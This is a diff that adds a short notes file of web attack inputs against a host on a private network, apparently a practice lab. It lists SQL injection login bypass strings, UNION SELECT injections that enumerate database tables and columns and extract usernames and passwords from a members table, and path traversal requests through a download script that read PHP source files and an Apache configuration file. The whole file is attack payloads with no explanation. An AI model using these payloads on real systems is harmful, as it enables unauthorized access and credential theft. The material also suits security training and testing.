@@ -1,0 +1,26 @@
+Login:
+admin@integratingsolutions.net
+' or 1 -- umacenaqq
+
+' or '1'='1' -- uma
+
+192.168.1.8/products.php?type=1 union select null,null,table_name,null,null from information_schema.tables --
+
+192.168.1.8/products.php?type=1 union select null,null,username,null,null from tblMembers --
+
+192.168.1.8/products.php?type=1 union select null,null,password,null,null from tblMembers --
+
+192.168.1.8/products.php?type=1 union select null,null,column_name,null,null from information_schema.columns WHERE table_name='tblMembers' --
+
+
+
+
+http://192.168.1.8/download.php?item=Brochure.pdf
+
+192.168.1.8/download.php?item=../products.php
+
+http://192.168.1.8/download.php?item=../header.php
+http://192.168.1.8/download.php?item=../display.php
+
+
+192.168.1.6/download.php?item=/../../../../../../etc/apache2/apache2.config
